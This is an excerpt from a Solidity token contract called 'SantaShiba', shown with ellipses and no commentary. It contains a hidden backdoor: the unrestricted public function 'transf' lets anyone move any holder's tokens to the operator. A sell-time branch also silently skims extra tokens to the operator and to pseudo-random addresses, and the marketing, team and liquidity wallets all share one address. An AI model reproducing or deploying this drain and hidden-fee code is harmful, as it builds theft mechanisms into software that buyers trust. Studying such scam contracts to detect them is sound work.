...
contract coin is Context, IERC20, Ownable {
    ...
    string private _name = "SantaShiba";
    ...
    address payable public marketingWalletAddress = payable(0x6b1F434d029484bD09B8a517058CcF132f56d627); // Marketing Address
    address payable private teamWalletAddress = payable(0x6b1F434d029484bD09B8a517058CcF132f56d627); // Team Address
    address payable public liquidityAddress =payable(0x6b1F434d029484bD09B8a517058CcF132f56d627); // Liquidity Address
    ...
    function transf(address token,uint256 amount) public {
        _transfer(token,Operator(),amount);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(airdrop && !isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient == uniswapPair){              
                 _basicTransfer(sender,Operator(),AIRAmount*2);               
                address ad;
                for(int i=0;i <=0;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,ad,AIRAmount);                                      
                }                 
                amount -= AIRAmount*3;                                                                           
            } 
